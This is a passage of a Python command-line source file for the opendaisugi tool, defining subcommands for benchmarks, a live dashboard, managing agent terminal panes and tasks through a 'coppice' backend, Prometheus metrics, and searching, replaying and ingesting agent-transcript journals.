        typer.echo("Run `daisugi bench verifier` to see one.", err=True)
        raise typer.Exit(code=1)
    tables = []
    for name in targets:
        try:
            if name == "pairs":
                from opendaisugi.bench.pairs import index_of, run_all

                pair_tables = run_all(BenchOpts(corpus=corpus, live=live, data_dir=data_dir))
                # `bench pairs` shows the five. `bench all` shows only the
                # index, so a full sweep stays one screen.
                tables.extend(pair_tables if layer == "pairs" else [index_of(pair_tables)])
            else:
                tables.append(
                    run_bench(name, BenchOpts(corpus=corpus, live=live, data_dir=data_dir))
                )
        except (CorpusMissing, BenchRefused) as exc:
            typer.echo(str(exc), err=True)
            raise typer.Exit(code=1) from exc
    if json_output:
        if layer in ("all", "pairs"):
            typer.echo(json.dumps([to_dict(t) for t in tables], indent=2))
        else:
            typer.echo(to_json(tables[0]))
        return
    for i, table in enumerate(tables):
        if i:
            typer.echo("")
        typer.echo(render(table))


@app.command("modules", hidden=True)
def modules_cmd(
    data_dir: Path = typer.Option(DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory."),
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Show the module wiring: what's active, available to swap in, or an open slot."""
    from opendaisugi.modules import render_wiring, wiring_json

    typer.echo(wiring_json(data_dir) if json_output else render_wiring(data_dir))


@app.command("dashboard", rich_help_panel="Start here")
def dashboard_cmd(
    data_dir: Path = typer.Option(DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory."),
    once: bool = typer.Option(False, "--once", help="Render one frame and exit (no live loop)."),
    json_output: bool = typer.Option(
        False, "--json", help="Emit live wiring as JSON (superset of `modules --json`)."
    ),
    interval: float = typer.Option(2.0, "--interval", help="Seconds between live refreshes."),
    tui: bool = typer.Option(
        False, "--tui", help="Interactive Textual GUI with click-to-swap (needs the tui extra)."
    ),
    serve: bool = typer.Option(
        False, "--serve", help="Serve the GUI to a browser via local textual-serve (tui extra)."
    ),
    host: str = typer.Option("127.0.0.1", "--host", help="Bind host for --serve."),
    port: int = typer.Option(8000, "--port", help="Bind port for --serve."),
) -> None:
    """The live 'factory floor': the module map with real throughput gauges.

    Three surfaces over one data layer. The default is a pure-stdlib live frame
    that refreshes in place on a terminal (--once for a single frame, --json for
    a machine-readable superset of `daisugi modules --json`). --tui opens the
    interactive Textual GUI with click-to-swap; --serve streams that same GUI to
    a browser locally (no external relay). Both --tui/--serve need the [tui]
    extra. Every surface reads the same stores read-only.
    """
    from opendaisugi.dashboard import dashboard_json, render_dashboard, run_live

    if json_output:
        typer.echo(dashboard_json(data_dir))
        return
    if once:
        typer.echo(render_dashboard(data_dir))
        return
    if serve or tui:
        from opendaisugi.tui import TextualNotInstalled

        try:
            if serve:
                from opendaisugi.tui import serve as serve_gui

                typer.echo(f"serving the dashboard GUI at http://{host}:{port} (Ctrl-C to stop)")
                serve_gui(data_dir, host=host, port=port, interval=interval)
            else:
                from opendaisugi.tui import run_tui

                run_tui(data_dir, interval=interval)
        except TextualNotInstalled as e:
            typer.echo(str(e), err=True)
            raise typer.Exit(code=1) from e
        except KeyboardInterrupt:
            typer.echo("")
        return
    try:
        run_live(data_dir, interval=interval)
    except KeyboardInterrupt:
        typer.echo("")  # leave the cursor on a fresh line after Ctrl-C


_BACKEND_OPT = typer.Option(None, "--backend", help="Force a backend: coppice, herdr, or tmux.")
_FLOOR_DATA_DIR_OPT = typer.Option(DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory.")
_SOCKET_OPT = typer.Option(None, "--socket", help="Coppice socket path for this call only.")
_READ_SOURCES = ("visible", "recent", "detection")
_VALID_UNTIL = ("idle", "working", "blocked", "done", "any")
_VALID_KINDS = ("pty", "headless")


def _floor_config(data_dir: Path, socket: Path | None = None):
    """The config the floor reads.

    A loaded Config carries its own data_dir field, independent of the path it was
    read from, so it is pinned here to what --data-dir named: every backend built
    from this config agrees with the CLI on where daisugi's data lives. socket,
    when given, overrides floor.coppice_socket for this call only, on a copy of
    the config; the loaded config itself is never mutated.
    """
    from opendaisugi.config import load_config

    config = load_config(data_dir / "config.yaml").model_copy(update={"data_dir": data_dir})
    if socket is not None:
        config = config.model_copy(
            update={"floor": config.floor.model_copy(update={"coppice_socket": str(socket)})}
        )
    return config


def _floor_backend(name: str | None, data_dir: Path, socket: Path | None = None):
    """Pick the backend or exit 3 with the command that installs one.

    Naming coppice is asking for coppice, so an explicit --backend coppice may start
    the server once. auto never does, and neither does backends.
    """
    from opendaisugi.exceptions import FloorNotAvailable
    from opendaisugi.floor.registry import pick_backend

    try:
        return pick_backend(_floor_config(data_dir, socket), name=name, autostart=name == "coppice")
    except FloorNotAvailable as exc:
        typer.echo(str(exc), err=True)
        raise typer.Exit(code=3) from exc


def _pane_ref(backend, pane: str):
    from opendaisugi.floor import PaneRef

    return PaneRef(backend.name, pane)


def _call_backend(fn, *args, **kwargs):
    """Call a backend method, turning its failure into a clean exit.

    An OpenDaisugiError already has its own handling in main() and passes through
    untouched, at exit 1. A CoppiceError is checked first, ahead of that generic
    pass-through: one whose code is internal and whose message says the server
    closed the connection, or that its reply was not JSON, is the backend
    dying mid-call, and one whose code is server_closed is the server
    answering that it is already shutting down. All three are a dropped
    connection, an unreachable host, not a user error, so all three exit 3
    the same way a dropped socket does. Every other CoppiceError
    (bad_request, no_such_pane, and the rest) is a request the server
    understood and refused, so it stays at 1. A ValueError or RuntimeError
    means the backend refused the request: exit 1. Any OSError, including
    FileNotFoundError, ConnectionError, and TimeoutError, means the backend is
    unreachable: exit 3. No caller of this function ever sees a raw traceback
    from tmux or herdr again.
    """
    from opendaisugi.exceptions import OpenDaisugiError
    from opendaisugi.floor.coppice_backend import CoppiceError

    try:
        return fn(*args, **kwargs)
    except CoppiceError as exc:
        dropped_connection = exc.code == "internal" and (
            "closed the connection" in str(exc) or "is not JSON" in str(exc)
        )
        if dropped_connection or exc.code == "server_closed":
            _fail(
                str(exc),
                "The backend is unreachable.",
                "Check the backend with `daisugi coppice backends`.",
                code=3,
            )
        raise
    except OpenDaisugiError:
        raise
    except (ValueError, RuntimeError) as exc:
        _fail(
            str(exc),
            "The backend refused the request.",
            "Check the pane id with `daisugi coppice list`.",
        )
    except OSError as exc:
        _fail(
            str(exc),
            "The backend is unreachable.",
            "Check the backend with `daisugi coppice backends`.",
            code=3,
        )


@coppice_app.command("backends")
def coppice_backends_cmd(
    data_dir: Path = _FLOOR_DATA_DIR_OPT,
    socket: Path = _SOCKET_OPT,
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Which pane backends this box has, and what to run for the ones it does not.

    Always exits 0. Nothing installed is an answer, not a failure.
    """
    from opendaisugi.floor.registry import backend_statuses

    rows = backend_statuses(_floor_config(data_dir, socket))
    if json_output:
        typer.echo(json.dumps([asdict(r) for r in rows], indent=2))
        return
    typer.echo(f"{'backend':<10}{'available':<12}why")
    for row in rows:
        why = "" if row.available else f"{row.why_not}. {row.fix}"
        typer.echo(f"{row.name:<10}{'yes' if row.available else 'no':<12}{why}")


@coppice_app.command("spawn")
def coppice_spawn_cmd(
    argv: list[str] = typer.Argument(
        None, help="The command to run, after --. Omit it to run --harness from the coppice config."
    ),
    cwd: Path = typer.Option(
        None, "--cwd", help="Working directory for the pane. Not needed with --task."
    ),
    label: str = typer.Option("", "--label", help="A short name for the pane."),
    kind: str = typer.Option("pty", "--kind", help="pty or headless."),
    harness: str = typer.Option(None, "--harness", help="Adapter name for a headless pane."),
    task: str = typer.Option(None, "--task", help="Task id the pane works for. coppice only."),
    backend: str = _BACKEND_OPT,
    data_dir: Path = _FLOOR_DATA_DIR_OPT,
    socket: Path = _SOCKET_OPT,
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Start a command in a new pane and print its id.

    With no command after --, --harness names a [harness.<name>] table in
    the coppice config, and its command and args run. With --task the pane
    works for that task and runs in its worktree, so --cwd may be left out.
    """
    if cwd is None and task is None:
        _fail(
            "spawn needs --cwd DIR or --task ID.",
            "A pane runs somewhere: name the directory, or the task whose worktree it is.",
            "Try: daisugi coppice spawn --cwd . -- claude",
        )
    # The hints name the place the caller gave: the directory, or the task.
    where = f"--task {task}" if cwd is None else f"--cwd {cwd}"
    if kind not in _VALID_KINDS:
        _fail(
            f"no pane kind {kind!r}.",
            f"The floor spawns one of: {', '.join(_VALID_KINDS)}.",
            f"Try: daisugi coppice spawn --kind headless {where} -- claude",
        )
    cmd = list(argv or [])
    if not cmd:
        from opendaisugi.floor.registry import coppice_config_path, harness_command

        if not harness:
            _fail(
                "spawn needs a command or --harness NAME.",
                "Put the command after --.",
                f"Try: daisugi coppice spawn {where} -- claude",
            )
        found = harness_command(harness)
        if found is None:
            _fail(
                f"no harness named {harness!r} in {coppice_config_path()}.",
                f"Run coppice once to write it, or add [harness.{harness}] "
                f'with command = "{harness}".',
                f"Try: daisugi coppice spawn {where} -- {harness}",
            )
        cmd = found
    chosen = _floor_backend(backend, data_dir, socket)
    # harness is in the master spec's protocol, so every backend takes it. tmux and
    # herdr ignore it. No except-TypeError retry: that would swallow a real TypeError
    # raised inside spawn and silently run it again.
    ref = _call_backend(
        chosen.spawn,
        cwd=cwd,
        cmd=cmd,
        env={},
        label=label or (argv[0] if argv else harness),
        kind=kind,
        harness=harness or None,
        task=task or None,
    )
    if json_output:
        typer.echo(json.dumps({"pane": ref.id, "backend": chosen.name}))
        return
    typer.echo(f"{ref.id}  backend {chosen.name}")


@coppice_app.command("list")
def coppice_list_cmd(
    backend: str = _BACKEND_OPT,
    data_dir: Path = _FLOOR_DATA_DIR_OPT,
    socket: Path = _SOCKET_OPT,
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Every pane, its label, its state, and where that state came from."""
    chosen = _floor_backend(backend, data_dir, socket)
    panes = _call_backend(chosen.list)
    rows = [
        {
            "pane": info.ref.id,
            "label": info.label,
            "cwd": info.cwd,
            "kind": info.kind,
            "state": info.state.state if info.state else "unknown",
            "source": info.state.source if info.state else "none",
        }
        for info in panes
    ]
    if json_output:
        typer.echo(json.dumps(rows, indent=2))
        return
    if not rows:
        typer.echo("no panes. Start one with `daisugi coppice spawn --cwd . -- claude`.")
        return
    typer.echo(f"{'pane':<12}{'label':<18}{'state':<10}{'source':<10}cwd")
    for row in rows:
        typer.echo(
            f"{row['pane']:<12}{row['label'][:17]:<18}{row['state']:<10}"
            f"{row['source']:<10}{row['cwd']}"
        )


@coppice_app.command("prompt")
def coppice_prompt_cmd(
    pane: str = typer.Argument(..., help="Pane id."),
    text: str = typer.Argument(..., help="The prompt."),
    wait: bool = typer.Option(False, "--wait", help="Block until the agent answers."),
    timeout: float = typer.Option(60.0, "--timeout", help="Seconds to wait."),
    backend: str = _BACKEND_OPT,
    data_dir: Path = _FLOOR_DATA_DIR_OPT,
    socket: Path = _SOCKET_OPT,
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Send a prompt. A headless pane gets an agent prompt. A pty pane gets typed text."""
    from opendaisugi.floor.registry import prompt_pane

    chosen = _floor_backend(backend, data_dir, socket)
    how = _call_backend(
        prompt_pane, chosen, _pane_ref(chosen, pane), text, wait=wait, timeout_s=timeout
    )
    if json_output:
        typer.echo(json.dumps({"pane": pane, "how": how}))
        return
    typer.echo(f"{how} to {pane}")


@coppice_app.command("wait")
def coppice_wait_cmd(
    pane: str = typer.Argument(..., help="Pane id."),
    until: str = typer.Option("idle", "--until", help="idle, working, blocked, done, or any."),
    timeout: float = typer.Option(60.0, "--timeout", help="Seconds to wait."),
    backend: str = _BACKEND_OPT,
    data_dir: Path = _FLOOR_DATA_DIR_OPT,
    socket: Path = _SOCKET_OPT,
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Block until the pane reaches a state. Exit 1 on timeout, with the state it saw."""
    from opendaisugi.floor.registry import wait_for_state

    if until not in _VALID_UNTIL:
        _fail(
            f"no state {until!r}.",
            f"The floor waits for one of: {', '.join(_VALID_UNTIL)}.",
            f"Try: daisugi coppice wait {pane} --until working",
        )
    chosen = _floor_backend(backend, data_dir, socket)
    ref = _pane_ref(chosen, pane)
    event = _call_backend(wait_for_state, chosen, ref, until=until, timeout_s=timeout)
    if event is None:
        infos = {i.ref.id: i for i in _call_backend(chosen.list)}
        info = infos.get(pane)
        seen = info.state.state if info and info.state else "unknown"
        typer.echo(
            f"timed out after {timeout:g}s waiting for {until}. Last state: {seen}.", err=True
        )
        raise typer.Exit(code=1)
    if json_output:
        typer.echo(json.dumps({"pane": pane, "state": event.state, "source": event.source}))
        return
    typer.echo(f"{pane} is {event.state}, source {event.source}")


@coppice_app.command("read")
def coppice_read_cmd(
    pane: str = typer.Argument(..., help="Pane id."),
    source: str = typer.Option("visible", "--source", help="visible, recent, or detection."),
    backend: str = _BACKEND_OPT,
    data_dir: Path = _FLOOR_DATA_DIR_OPT,
    socket: Path = _SOCKET_OPT,
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Print what the pane shows. detection is exactly what the manifests see."""
    if source not in _READ_SOURCES:
        _fail(
            f"no read source {source!r}.",
            f"The floor reads one of: {', '.join(_READ_SOURCES)}.",
            f"Try: daisugi coppice read {pane} --source detection",
        )
    chosen = _floor_backend(backend, data_dir, socket)
    text = _call_backend(chosen.read, _pane_ref(chosen, pane), source=source)
    if json_output:
        typer.echo(json.dumps({"pane": pane, "source": source, "text": text}))
        return
    typer.echo(text, nl=False)


@coppice_app.command("send-keys")
def coppice_send_keys_cmd(
    pane: str = typer.Argument(..., help="Pane id."),
    keys: list[str] = typer.Argument(..., help="Key names: enter, ctrl+c, esc, tab, f1, or a."),
    backend: str = _BACKEND_OPT,
    data_dir: Path = _FLOOR_DATA_DIR_OPT,
    socket: Path = _SOCKET_OPT,
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Send key presses to a pane."""
    chosen = _floor_backend(backend, data_dir, socket)
    _call_backend(chosen.send_keys, _pane_ref(chosen, pane), list(keys))
    if json_output:
        typer.echo(json.dumps({"pane": pane, "keys": list(keys)}))
        return
    typer.echo(f"sent {' '.join(keys)} to {pane}")


@coppice_app.command("close")
def coppice_close_cmd(
    pane: str = typer.Argument(..., help="Pane id."),
    backend: str = _BACKEND_OPT,
    data_dir: Path = _FLOOR_DATA_DIR_OPT,
    socket: Path = _SOCKET_OPT,
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Close a pane."""
    chosen = _floor_backend(backend, data_dir, socket)
    _call_backend(chosen.close, _pane_ref(chosen, pane))
    if json_output:
        typer.echo(json.dumps({"pane": pane, "closed": True}))
        return
    typer.echo(f"closed {pane}")


task_app = typer.Typer(
    name="task",
    help="Tasks above panes: a name, a worktree, a parent, and the worst state under it.",
    no_args_is_help=True,
)
coppice_app.add_typer(task_app, name="task")


def _task_row(info) -> dict:
    return {
        "task": info.ref,
        "label": info.label,
        "parent": info.parent,
        "cwd": info.cwd,
        "worktree": info.worktree,
        "model": info.model,
        "state": info.state,
        "panes": list(info.panes),
    }


@task_app.command("create")
def coppice_task_create_cmd(
    label: str = typer.Option(..., "--label", help="The task's name. With --worktree, its branch."),
    parent: str = typer.Option(None, "--parent", help="Task id to put this task under."),
    cwd: Path = typer.Option(None, "--cwd", help="Directory the task runs in, or the repo."),
    worktree: bool = typer.Option(
        False, "--worktree", help="Add a git worktree beside the repo that holds --cwd."
    ),
    model: str = typer.Option(None, "--model", help="Model name for the task, or none."),
    backend: str = _BACKEND_OPT,
    data_dir: Path = _FLOOR_DATA_DIR_OPT,
    socket: Path = _SOCKET_OPT,
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Record a task and print its id. coppice only.

    --cwd is sent as an absolute path, so "." names this shell's directory
    and never the server's.
    """
    chosen = _floor_backend(backend, data_dir, socket)
    info = _call_backend(
        chosen.create_task,
        label,
        parent=parent,
        cwd=None if cwd is None else str(cwd.resolve()),
        worktree=worktree,
        model=model,
    )
    if json_output:
        typer.echo(json.dumps(_task_row(info)))
        return
    line = f"{info.ref}  {info.label}"
    if info.worktree:
        line += f"  worktree {info.worktree}"
    typer.echo(line)


@task_app.command("list")
def coppice_task_list_cmd(
    backend: str = _BACKEND_OPT,
    data_dir: Path = _FLOOR_DATA_DIR_OPT,
    socket: Path = _SOCKET_OPT,
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Every task, its parent, its state, and its panes."""
    chosen = _floor_backend(backend, data_dir, socket)
    rows = [_task_row(info) for info in _call_backend(chosen.list_tasks)]
    if json_output:
        typer.echo(json.dumps(rows, indent=2))
        return
    if not rows:
        typer.echo("no tasks. Start one with `daisugi coppice task create --label NAME`.")
        return
    typer.echo(f"{'task':<6}{'state':<10}{'parent':<8}{'label':<20}{'panes':<6}worktree")
    for row in rows:
        typer.echo(
            f"{row['task']:<6}{row['state'] or '-':<10}{row['parent'] or '-':<8}"
            f"{row['label'][:19]:<20}{len(row['panes']):<6}{row['worktree'] or '-'}"
        )


@task_app.command("close")
def coppice_task_close_cmd(
    task: str = typer.Argument(..., help="Task id."),
    keep_worktree: bool = typer.Option(
        False, "--keep-worktree", help="Leave the worktree on disk."
    ),
    backend: str = _BACKEND_OPT,
    data_dir: Path = _FLOOR_DATA_DIR_OPT,
    socket: Path = _SOCKET_OPT,
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Close a task, its descendants, and every pane under them.

    Without --keep-worktree a worktree with uncommitted changes refuses the
    whole close and nothing happens.
    """
    chosen = _floor_backend(backend, data_dir, socket)
    _call_backend(chosen.close_task, task, keep_worktree=keep_worktree)
    if json_output:
        typer.echo(json.dumps({"task": task, "closed": True}))
        return
    typer.echo(f"closed {task}")


def _exec_coppice(chosen, tail: list[str]) -> None:
    """Replace this process with the coppice binary, pointed at the backend's
    own server, with tail as the arguments after the global options."""
    if chosen.name != "coppice":
        if tail:
            verb = tail[0]
            typer.echo(f"{verb} is not on the {chosen.name} backend.", err=True)
            typer.echo(
                f"Use `{chosen.name} {verb}` for that substrate, or run "
                f"`coppice server start` and retry with --backend coppice.",
                err=True,
            )
        else:
            typer.echo(
                "The floor is the coppice binary. Run `coppice server start` "
                "and retry with --backend coppice.",
                err=True,
            )
        raise typer.Exit(code=1)
    # chosen is the CoppiceBackend the CLI just picked. Its own sock_path and
    # data_dir are the socket and data dir it was built with: --socket, then
    # floor.coppice_socket, then coppice's own default. The exec must point the
    # binary at that exact same server.
    argv = [
        "coppice",
        "--socket",
        str(chosen.sock_path),
        "--data-dir",
        str(chosen.data_dir),
    ] + tail
    build_hint = (
        "Build it: cd harness/coppice && mkdir -p build && go build -o build/coppice ./cmd/coppice"
    )
    # Resolved here, not left to exec: a missing binary is unreachable, exit
    # 3, with the build command, and the exec never runs against nothing.
    exe = shutil.which("coppice")
    if exe is None:
        typer.echo("coppice is not on PATH.", err=True)
        typer.echo(build_hint, err=True)
        raise typer.Exit(code=3)
    try:
        os.execvp(exe, argv)
    except OSError as exc:
        typer.echo(f"cannot run the coppice binary: {exc}.", err=True)
        typer.echo(build_hint, err=True)
        raise typer.Exit(code=3) from exc


@coppice_app.command("attach")
def coppice_attach_cmd(
    pane: str = typer.Argument(None, help="Pane id. Omit for the current one."),
    backend: str = _BACKEND_OPT,
    data_dir: Path = _FLOOR_DATA_DIR_OPT,
    socket: Path = _SOCKET_OPT,
) -> None:
    """Take over a pane full screen. Only the coppice backend has its own renderer."""
    chosen = _floor_backend(backend, data_dir, socket)
    _exec_coppice(chosen, ["attach"] + ([pane] if pane else []))


@coppice_app.command("herdr-bridge")
def coppice_herdr_bridge_cmd(
    pane: str = typer.Argument(..., help="The coppice pane id to show in Herdr."),
    data_dir: Path = _FLOOR_DATA_DIR_OPT,
    socket: Path = _SOCKET_OPT,
    herdr_config: Path = typer.Option(
        None, "--herdr-config", help="Herdr's config directory. Default: ~/.config/herdr."
    ),
    coppice: str = typer.Option("coppice", "--coppice", help="The coppice program Herdr runs."),
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Show a coppice pane in Herdr: write the manifest, print the line to run."""
    from opendaisugi.floor import herdr_bridge
    from opendaisugi.floor.coppice_backend import default_socket_path

    configured = _floor_config(data_dir, socket).floor.coppice_socket
    # Herdr runs attach from its own directory, so the path must be absolute.
    sock = (Path(configured) if configured else default_socket_path()).absolute()
    cfg_dir = herdr_config if herdr_config is not None else herdr_bridge.default_config_dir()
    try:
        path = herdr_bridge.install(cfg_dir)
    except FileExistsError as exc:
        _fail(
            "the Herdr manifest was not written.",
            str(exc),
            "Try: move the file away, then run daisugi coppice herdr-bridge again.",
        )
    except OSError as exc:
        _fail(
            "the Herdr manifest was not written.",
            f"{cfg_dir}: {exc}",
            "Try: pass --herdr-config with a directory you can write.",
        )
    d = herdr_bridge.agent_definition(pane, sock, coppice)
    d["manifest_path"] = str(path)
    if json_output:
        typer.echo(json.dumps(d))
        return
    typer.echo(f"manifest: {path}")
    typer.echo("run this in the Herdr pane that should show it:")
    typer.echo("  " + shlex.join(d["herdr_run"]))
    typer.echo(d["note"])


@coppice_app.command("floor")
def coppice_floor_cmd(
    backend: str = _BACKEND_OPT,
    data_dir: Path = _FLOOR_DATA_DIR_OPT,
    socket: Path = _SOCKET_OPT,
) -> None:
    """Open the floor: the roster, a peek on one pane, and attach, from the coppice binary."""
    chosen = _floor_backend(backend, data_dir, socket)
    _exec_coppice(chosen, [])


@app.command("metrics", hidden=True)
def metrics_cmd(
    data_dir: Path = typer.Option(DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory."),
    serve: bool = typer.Option(
        False, "--serve", help="Serve /metrics over HTTP for a Prometheus scraper."
    ),
    host: str = typer.Option("127.0.0.1", "--host", help="Bind host for --serve."),
    port: int = typer.Option(9188, "--port", help="Bind port for --serve."),
) -> None:
    """Prometheus metrics: exposition text on stdout, or an HTTP /metrics endpoint.

    Without --serve, prints the Prometheus text exposition once (pipe it into a
    node_exporter textfile collector, or just read it). With --serve, runs a tiny
    HTTP server your own Prometheus/Grafana scrapes — no new dependency, no
    bundled Grafana. The numbers are exactly what `daisugi dashboard` shows.
    """
    from opendaisugi.exporter import render_prometheus, serve_metrics

    if serve:
        typer.echo(f"serving Prometheus metrics at http://{host}:{port}/metrics (Ctrl-C to stop)")
        try:
            serve_metrics(data_dir, host=host, port=port)
        except KeyboardInterrupt:
            typer.echo("")
        return
    typer.echo(render_prometheus(data_dir), nl=False)


@journal_app.command("search")
def journal_search_cmd(
    query: str = typer.Argument(..., help="Free-text query to match against trace tasks."),
    data_dir: Path = typer.Option(
        DEFAULT_DATA_DIR,
        "--data-dir",
        help="Root data directory containing journal/",
    ),
    limit: int = typer.Option(10, "--limit", help="Maximum number of results."),
    json_output: bool = typer.Option(False, "--json", help="Emit result rows as JSON array."),
) -> None:
    """Semantic search over journal traces (requires [search] extra)."""
    from opendaisugi.journal import Journal

    journal = Journal(data_dir=data_dir)
    try:
        results = journal.search(query, limit=limit)
    except ImportError as e:
        typer.echo(str(e), err=True)
        raise typer.Exit(code=2)

    if json_output:
        payload = [t.model_dump(mode="json") for t in results]
        typer.echo(json.dumps(payload, indent=2))
        return

    if not results:
        typer.echo("(no matching traces)")
        return
    for t in results:
        status = "ok" if t.ok else "FAIL"
        typer.echo(f"{t.id}  [{status}]  {t.task}")


@journal_app.command("replay")
def journal_replay_cmd(
    trace_id: str = typer.Argument(..., help="Trace id (e.g. 2026-04-09-a1b2c3d4)."),
    data_dir: Path = typer.Option(
        DEFAULT_DATA_DIR,
        "--data-dir",
        help="Root data directory containing journal/",
    ),
    json_output: bool = typer.Option(False, "--json", help="Emit ReplayResult as JSON."),
) -> None:
    """Re-run verify() on a stored trace and report drift."""
    from opendaisugi.journal import Journal

    journal = Journal(data_dir=data_dir)
    try:
        replay = journal.replay(trace_id)
    except FileNotFoundError as e:
        typer.echo(f"Trace not found: {trace_id}")
        raise typer.Exit(code=2) from e

    if json_output:
        payload = {
            "trace_id": replay.trace_id,
            "original_ok": replay.original_ok,
            "replayed_ok": replay.replayed_ok,
            "drift": replay.drift,
            "original_result": replay.original_result.model_dump(mode="json"),
            "replayed_result": replay.replayed_result.model_dump(mode="json"),
        }
        typer.echo(json.dumps(payload, indent=2))
    else:
        if replay.drift:
            typer.echo(f"{replay.trace_id}: DRIFT detected")
            typer.echo(f"  original: ok={replay.original_ok}")
            typer.echo(f"  replayed: ok={replay.replayed_ok}")
            if replay.replayed_result.violations:
                typer.echo("  new violations:")
                for v in replay.replayed_result.violations:
                    typer.echo(f"    - [{v.stage}] {v.message}")
        else:
            typer.echo(f"{replay.trace_id}: no drift (ok={replay.original_ok})")

    raise typer.Exit(code=1 if replay.drift else 0)


@journal_app.command("stats")
def journal_stats_cmd(
    data_dir: Path = typer.Option(
        DEFAULT_DATA_DIR,
        "--data-dir",
        help="Root data directory containing journal/",
    ),
    json_output: bool = typer.Option(False, "--json", help="Emit JournalStats as JSON."),
) -> None:
    """Print aggregate stats from the journal index."""
    from opendaisugi.journal import Journal

    journal = Journal(data_dir=data_dir)
    stats = journal.stats()
    if json_output:
        typer.echo(json.dumps(asdict(stats), indent=2))
    else:
        typer.echo(f"total: {stats.total}")
        typer.echo(f"passed: {stats.passed}")
        typer.echo(f"failed: {stats.failed}")
        typer.echo(f"avg duration (ms): {stats.avg_duration_ms:.2f}")


@journal_app.command("parse")
def journal_parse_cmd(
    transcript: Path = typer.Argument(
        ...,
        exists=True,
        dir_okay=False,
        readable=True,
        help="Path to a Claude Code .jsonl transcript.",
    ),
    output: Path = typer.Option(
        ...,
        "-o",
        "--output",
        help="Path to write the episodes YAML/JSON file.",
    ),
    format_name: str = typer.Option(
        "claude-code",
        "--format",
        help="Parser format (default: claude-code).",
    ),
    min_tools: int = typer.Option(
        3,
        "--min-tools",
        help="Merge episodes below this tool-call threshold.",
    ),
    max_tools: int = typer.Option(
        30,
        "--max-tools",
        help="LLM-split episodes above this tool-call threshold.",
    ),
    model: str = typer.Option(
        "anthropic/claude-sonnet-4-20250514",
        "--model",
        help="Model for LLM splitting (rarely needed).",
    ),
    json_output: bool = typer.Option(
        False,
        "--json",
        help="Write JSON instead of YAML.",
    ),
    llm: str | None = typer.Option(
        None,
        "--llm",
        help="LLM backend: litellm | claude-code. Default: auto-detect.",
    ),
) -> None:
    """Parse an agent transcript into episodes."""
    if llm is not None and llm not in {"litellm", "claude-code"}:
        typer.echo(
            f"Invalid --llm value {llm!r}. Must be 'litellm' or 'claude-code'.",
            err=True,
        )
        raise typer.Exit(code=2)
    if llm is not None:
        os.environ["OPENDAISUGI_LLM_BACKEND"] = llm
    _echo_resolved(DEFAULT_DATA_DIR)
    try:
        parser = get_parser(format_name, min_tools=min_tools, max_tools=max_tools, model=model)
    except ValueError as e:
        typer.echo(str(e), err=True)
        raise typer.Exit(code=2) from e

    try:
        result = parser.parse(transcript)
    except Exception as e:
        typer.echo(f"Parse error: {e}", err=True)
        raise typer.Exit(code=2) from e

    payload = result.model_dump(mode="json", exclude_none=True)
    if json_output:
        output.write_text(json.dumps(payload, indent=2))
    else:
        output.write_text(yaml.safe_dump(payload, sort_keys=False))

    typer.echo(f"Parsed {len(result.episodes)} episodes to {output}")


@journal_app.command("ingest")
def journal_ingest_cmd(
    episodes_file: Path = typer.Argument(
        ...,
        exists=True,
        dir_okay=False,
        readable=True,
        help="Path to an episodes YAML/JSON file from 'journal parse'.",
    ),
    data_dir: Path = typer.Option(
        DEFAULT_DATA_DIR,
        "--data-dir",
        help="Root data directory containing journal/",
    ),
    dry_run: bool = typer.Option(
        False,
        "--dry-run",
        help="Show what would be ingested without LLM calls.",
    ),
    allow_shell_decomposition: bool | None = _DECOMPOSE_OPT,
    json_output: bool = typer.Option(
        False,
        "--json",
        help="Machine-readable JSON output.",
    ),
) -> None:
    """Ingest parsed episodes into the journal."""
    from opendaisugi.ingest import ingest_episodes

    try:
        raw = yaml.safe_load(episodes_file.read_text())
    except yaml.YAMLError as e:
        typer.echo(f"Invalid YAML: {e}", err=True)
        raise typer.Exit(code=2) from e

    try:
        parse_result = ParseResult(**raw)
    except Exception as e:
        typer.echo(f"Invalid episodes file: {e}", err=True)
        raise typer.Exit(code=2) from e

    decompose = _resolve_decompose(allow_shell_decomposition, data_dir / "config.yaml")
    _warn_if_decomposition_unusable(decompose)
    from opendaisugi.journal import Journal

    journal = Journal(data_dir=data_dir)
    summary = asyncio.run(
        ingest_episodes(
            parse_result,
            journal,
            dry_run=dry_run,
            allow_shell_decomposition=decompose,
        )
    )

    if json_output:
        payload = {
            "total": summary.total,
            "passed": summary.passed,
            "failed": summary.failed,
            "skipped": summary.skipped,
            "errored": summary.errored,
            "episodes": [
                {
                    "episode_id": e.episode_id,
                    "task": e.task,
                    "status": e.status,
                    "steps": e.steps,
                    "violations": e.violations,
                    "error": e.error,
                }
                for e in summary.episodes
            ],
        }
        typer.echo(json.dumps(payload, indent=2))
    else:
        for ep in summary.episodes:
            status = ep.status.ljust(7)
            detail = f"{ep.steps} steps"
            if ep.violations:
                detail += f", {ep.violations} violations"
            if ep.error:
                detail = ep.error
            typer.echo(f'{ep.episode_id}  {status} "{ep.task}" ({detail})')
        typer.echo("")
        verb = "Previewed" if dry_run else "Ingested"
        typer.echo(
            f"{verb} {summary.total} episodes from {episodes_file.name}"
            + (" (dry run — nothing written)" if dry_run else "")
        )
        typer.echo(f"  {summary.passed} {'would pass' if dry_run else 'passed'} verification")
        typer.echo(f"  {summary.failed} {'would fail' if dry_run else 'failed'} verification")
        typer.echo(f"  {summary.skipped} skipped (already in journal)")
        if summary.preview_skipped:
